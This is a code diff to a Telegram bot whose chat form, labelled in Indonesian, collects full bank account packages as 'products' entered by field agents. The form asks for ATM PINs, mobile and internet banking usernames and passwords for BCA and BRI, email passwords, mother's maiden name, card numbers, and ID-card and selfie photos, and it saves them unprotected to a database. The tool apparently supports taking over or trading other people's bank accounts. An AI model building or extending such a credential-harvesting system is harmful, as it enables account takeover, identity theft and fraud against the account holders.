@@ -31,34 +31,142 @@ const askNextField = async (chatId, session) => {
     'grade',
     'kcp',
     'nik',
-    'nama'
+    'nama',
+    'namaIbuKandung',
+    'tempatTanggalLahir',
+    'noRek',
+    'noAtm',
+    'validThru',
+    'noHp',
+    'pinAtm',
+    'pinWondr',
+    'passWondr',
+    'email',
+    'passEmail',
+    'expired',
+    'uploadFotoId',
+    'uploadFotoSelfie'
   ];
   const currentIndex = session.sessionStep || 0;
-  if (currentIndex >= steps.length) {
-    await bot.sendMessage(chatId, 'Data dasar sudah dikumpulkan. Untuk melanjutkan kolom sensitif dan upload foto, silakan buka Form Web App.');
-    await bot.sendMessage(chatId, 'Buka form:', {
-      reply_markup: {
-        inline_keyboard: [[
-          { text: 'Buka Form Input Produk', web_app: { url: `${FRONTEND_URL}/telegram-form` } }
-        ]]
+
+  // Custom logic for bank specific steps
+  if (session.formData && session.formData.bank) {
+    if (session.formData.bank === 'BCA') {
+      if (!steps.includes('myBCAUser')) {
+        steps.splice(18, 0, 'myBCAUser', 'myBCAPassword');
       }
-    });
-    session.state = 'idle';
-    session.sessionStep = 0;
-    await session.save();
+    } else if (session.formData.bank === 'BRI') {
+      if (!steps.includes('brimoUser')) {
+        steps.splice(18, 0, 'brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword');
+      }
+    }
+  }
+
+  if (currentIndex >= steps.length) {
+    await bot.sendMessage(chatId, '🎉 Semua data telah terkumpul! Sedang memproses pembuatan produk...');
+    await submitForm(chatId, session);
     return;
   }
 
   const field = steps[currentIndex];
   const labels = {
-    customer: 'Masukkan nama Customer',
-    bank: 'Masukkan nama Bank',
-    grade: 'Masukkan Grade',
-    kcp: 'Masukkan KCP',
-    nik: 'Masukkan NIK 16 digit',
-    nama: 'Masukkan Nama lengkap'
+    customer: '👤 Masukkan nama Customer:',
+    bank: '🏦 Masukkan nama Bank (BCA/BRI/Lainnya):',
+    grade: '📊 Masukkan Grade:',
+    kcp: '🏢 Masukkan KCP (Kantor Cabang):',
+    nik: '🆔 Masukkan NIK (16 digit):',
+    nama: '📛 Masukkan Nama Lengkap sesuai KTP:',
+    namaIbuKandung: '👩 Masukkan Nama Ibu Kandung:',
+    tempatTanggalLahir: '📅 Masukkan Tempat/Tanggal Lahir (contoh: Jakarta, 01-01-1990):',
+    noRek: '💳 Masukkan Nomor Rekening:',
+    noAtm: '🏧 Masukkan Nomor Kartu ATM:',
+    validThru: '📆 Masukkan Valid Thru (MM/YY):',
+    noHp: '📱 Masukkan Nomor HP terdaftar:',
+    pinAtm: '🔢 Masukkan PIN ATM:',
+    pinWondr: '🛡️ Masukkan PIN Wondr (jika ada):',
+    passWondr: '🔓 Masukkan Password Wondr (jika ada):',
+    email: '📧 Masukkan Email terdaftar:',
+    passEmail: '🔑 Masukkan Password Email:',
+    expired: '⏳ Masukkan Tanggal Expired (YYYY-MM-DD):',
+    myBCAUser: '👤 Masukkan Username myBCA:',
+    myBCAPassword: '🔑 Masukkan Password myBCA:',
+    brimoUser: '👤 Masukkan Username BRImo:',
+    brimoPassword: '🔑 Masukkan Password BRImo:',
+    briMerchantUser: '🏪 Masukkan Username BRI Merchant:',
+    briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
+    uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
+    uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE dengan KTP:'
   };
   await bot.sendMessage(chatId, labels[field]);
+};
+
+const submitForm = async (chatId, session) => {
+  try {
+    const Product = require('../models/Product');
+    const data = { ...session.formData };
+
+    // Convert expired to Date if exists
+    if (data.expired) {
+      data.expired = new Date(data.expired);
+    }
+
+    // Add metadata
+    data.codeAgen = session.kodeOrlap;
+    data.fieldStaff = session.kodeOrlap;
+    data.createdBy = session.userId; // Link to web user if authenticated
+
+    const product = new Product(data);
+    await product.save();
+
+    await bot.sendMessage(chatId, `✅ Produk berhasil dibuat!\nNo. Order: ${product._id}\nCustomer: ${product.customer}`);
+
+    // Reset session
+    session.state = 'idle';
+    session.sessionStep = 0;
+    session.formData = {};
+    await session.save();
+
+    await bot.sendMessage(chatId, 'Apa yang ingin Anda lakukan selanjutnya?', {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: 'Input Produk Lain', callback_data: 'start_chat_input' }],
+          [{ text: 'Buka Web App', web_app: { url: `${FRONTEND_URL}/telegram-form` } }]
+        ]
+      }
+    });
+
+  } catch (error) {
+    console.error('Error submitting form via Telegram:', error);
+    await bot.sendMessage(chatId, '❌ Gagal membuat produk: ' + error.message);
+    session.state = 'idle';
+    await session.save();
+  }
+};
+
+const downloadTelegramFile = async (fileId, fieldName) => {
+  try {
+    const path = require('path');
+    const fs = require('fs');
+    const uploadsDir = path.join(__dirname, '../uploads');
+
+    if (!fs.existsSync(uploadsDir)) {
+      fs.mkdirSync(uploadsDir, { recursive: true });
+    }
+
+    // bot.downloadFile returns the path where it was saved
+    const downloadedPath = await bot.downloadFile(fileId, uploadsDir);
+
+    // Rename to our secure format
+    const ext = path.extname(downloadedPath) || '.jpg';
+    const fileName = `secure_tg_${Date.now()}_${fieldName}${ext}`;
+    const newPath = path.join(uploadsDir, fileName);
+
+    fs.renameSync(downloadedPath, newPath);
+    return fileName;
+  } catch (error) {
+    console.error('Error downloading Telegram file:', error);
+    throw error;
+  }
 };
 
 const handleWebhook = async (req, res) => {
@@ -172,11 +280,53 @@ const handleWebhook = async (req, res) => {
     }
 
     if (telegramUser.state === 'collecting') {
-      const steps = ['customer', 'bank', 'grade', 'kcp', 'nik', 'nama'];
+      const steps = [
+        'customer', 'bank', 'grade', 'kcp', 'nik', 'nama',
+        'namaIbuKandung', 'tempatTanggalLahir', 'noRek', 'noAtm',
+        'validThru', 'noHp', 'pinAtm', 'pinWondr', 'passWondr',
+        'email', 'passEmail', 'expired', 'uploadFotoId', 'uploadFotoSelfie'
+      ];
+
+      // Inject bank specific steps
+      if (telegramUser.formData && telegramUser.formData.bank) {
+        if (telegramUser.formData.bank === 'BCA') {
+          if (!steps.includes('myBCAUser')) steps.splice(18, 0, 'myBCAUser', 'myBCAPassword');
+        } else if (telegramUser.formData.bank === 'BRI') {
+          if (!steps.includes('brimoUser')) steps.splice(18, 0, 'brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword');
+        }
+      }
+
       const idx = telegramUser.sessionStep || 0;
       const field = steps[idx];
       telegramUser.formData = telegramUser.formData || {};
-      telegramUser.formData[field] = text;
+
+      // Handle photos/documents
+      if (field === 'uploadFotoId' || field === 'uploadFotoSelfie') {
+        const photo = message.photo ? message.photo[message.photo.length - 1] : null;
+        const document = message.document;
+
+        if (!photo && !document) {
+          await bot.sendMessage(chatId, 'Silakan kirim foto atau dokumen gambar.');
+          return res.status(200).send('Expected photo');
+        }
+
+        try {
+          const fileId = photo ? photo.file_id : document.file_id;
+          const fileName = await downloadTelegramFile(fileId, field);
+          telegramUser.formData[field] = fileName;
+        } catch (err) {
+          await bot.sendMessage(chatId, 'Gagal menyimpan foto. Coba lagi.');
+          return res.status(200).send('Photo download error');
+        }
+      } else {
+        // Handle text input
+        if (!text) {
+          await bot.sendMessage(chatId, 'Mohon masukkan teks yang valid.');
+          return res.status(200).send('Expected text');
+        }
+        telegramUser.formData[field] = text;
+      }
+
       telegramUser.sessionStep = idx + 1;
       await telegramUser.save();
       await askNextField(chatId, telegramUser);
